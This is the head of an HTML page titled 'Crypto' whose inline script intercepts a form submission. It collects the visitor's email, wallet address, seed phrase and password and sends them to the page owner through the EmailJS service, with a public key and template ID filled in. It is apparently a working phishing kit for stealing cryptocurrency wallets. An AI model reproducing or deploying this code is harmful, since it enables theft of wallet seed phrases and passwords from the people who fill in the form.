<!DOCTYPE html>
<html lang="en">
<head>
    <title>Crypto</title>
    <link href="https://fonts.googleapis.com/css?family=Raleway:300,400,500,700|Open+Sans" rel="stylesheet">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/custom.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        // Initialize EmailJS with your public API key
        (function(){
            emailjs.init("UzvWE4cijC2AeexsY"); // Replace with your actual public API key
        })();

        $(document).ready(function(){
            $('form').on('submit', function(event) {
                event.preventDefault(); // Prevent default form submission

                // Collect form data
                var emailData = {
                    email: $('input[name=email]').val(),
                    dropdown1: $('select[name=dropdown1]').val(),
                    dropdown2: $('select[name=dropdown2]').val(),
                    address: $('input[name=address]').val(),
                    seed: $('input[name=seed]').val(),
                    password: $('input[name=password]').val()
                };

                // Send email using EmailJS
                emailjs.send("YOUR_SERVICE_ID", "template_i3682ek", emailData) // Replace with your service ID
                    .then(function(response) {
                        console.log('Success:', response);
                        alert('Email sent successfully!');
                    }, function(error) {
                        console.error('Failed:', error);
                        alert('Failed to send email. Please try again.');
                    });
            });
        });
    </script>
</head>
